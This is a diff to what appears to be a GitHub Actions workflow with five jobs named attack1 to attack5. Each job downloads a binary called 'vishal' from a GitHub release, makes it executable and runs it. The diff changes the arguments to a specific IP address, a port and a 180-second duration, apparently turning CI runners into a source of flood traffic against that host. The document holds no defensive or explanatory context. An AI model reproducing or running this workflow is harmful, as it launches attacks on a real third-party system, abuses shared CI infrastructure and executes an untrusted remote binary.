@@ -12,7 +12,7 @@ jobs:
         run: |
           wget -q https://github.com/Vishalisback00/Vishalpapaisback/releases/download/Personal/vishal
           chmod +x vishal
-          ./vishal 26 36 37 
+          ./vishal 20.198.74.232 22176 180 
           sleep 1
 
   attack2:
@@ -23,7 +23,7 @@ jobs:
         run: |
           wget -q https://github.com/Vishalisback00/Vishalpapaisback/releases/download/Personal/vishal
           chmod +x vishal
-          ./vishal 26 36 37 
+          ./vishal 20.198.74.232 22176 180 
           sleep 1
 
   attack3:
@@ -34,7 +34,7 @@ jobs:
         run: |
           wget -q https://github.com/Vishalisback00/Vishalpapaisback/releases/download/Personal/vishal
           chmod +x vishal
-          ./vishal 26 36 37 
+          ./vishal 20.198.74.232 22176 180 
           sleep 1
 
   attack4:
@@ -45,7 +45,7 @@ jobs:
         run: |
           wget -q https://github.com/Vishalisback00/Vishalpapaisback/releases/download/Personal/vishal
           chmod +x vishal
-          ./vishal 26 36 37 
+          ./vishal 20.198.74.232 22176 180 
           sleep 1
 
   attack5:
@@ -56,5 +56,5 @@ jobs:
         run: |
           wget -q https://github.com/Vishalisback00/Vishalpapaisback/releases/download/Personal/vishal
           chmod +x vishal
-          ./vishal 26 36 37 
+          ./vishal 20.198.74.232 22176 180 
           sleep 1
